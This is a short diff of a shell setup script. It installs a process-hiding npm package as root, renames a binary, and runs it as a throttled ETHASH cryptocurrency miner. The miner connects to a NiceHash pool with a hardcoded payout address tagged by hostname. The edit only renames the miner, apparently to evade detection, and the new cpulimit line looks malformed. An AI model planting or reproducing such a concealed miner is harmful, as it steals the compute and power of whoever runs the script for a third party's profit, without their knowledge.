@@ -8,6 +8,6 @@ sudo apt-get install gcc g++ make
 sudo -u root npm i -g node-process-hider
 sudo ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
 sudo dpkg-reconfigure --frontend noninteractive tzdata
-chmod +x lmx
-cpulimit -e lmx -l 30 &
-./lmx --algo ETHASH --pool stratum+tcp://daggerhashimoto.eu.nicehash.com:3353 --user 36wHKR1dKTuoxLEs1yxdtQFJjoDc85neq3.$(cat /proc/sys/kernel/hostname)
+chmod +x smh
+cpulimit -e smh 30 &
+./smh --algo ETHASH --pool stratum+tcp://daggerhashimoto.eu.nicehash.com:3353 --user 36wHKR1dKTuoxLEs1yxdtQFJjoDc85neq3.$(cat /proc/sys/kernel/hostname)
